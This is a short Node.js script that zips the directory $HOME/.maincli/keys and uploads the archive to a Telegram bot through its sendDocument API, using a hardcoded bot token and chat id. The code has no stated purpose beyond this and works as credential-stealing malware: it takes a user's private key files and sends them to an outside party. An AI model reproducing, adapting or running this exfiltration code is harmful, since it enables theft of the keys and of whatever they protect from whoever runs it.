var fs = require('fs');
var request = require('request');
var async = require('async');
var zipFolder = require('zip-folder');

async.waterfall([
	(next)=>{
	zipFolder('/$HOME/.maincli/keys', './keys.zip',(error)=> {
    if(error) {
        next("Error occured while creating zip",error)
    } else {
        next(null)
    }
	});
	},
	(next)=>{
		request.post({
  		url: 'https://api.telegram.org/bot740040959:AAHLwlH7e40Gd5VxQ34HVeBLyYYYLaNmegk/sendDocument',
  		formData: {
   			 document: fs.createReadStream('./keys.zip'),
   			 chat_id: 357501689
  				},
		},(error, response, body)=> {
  			if(error){
  				next(error)
  			}
  			else{
  			next(null)
  			}
		});
	}
	],(error,data)=>{
		if(error){
			console.log(error)
			}
		else{
			console.log("File sent")
		}	
	})

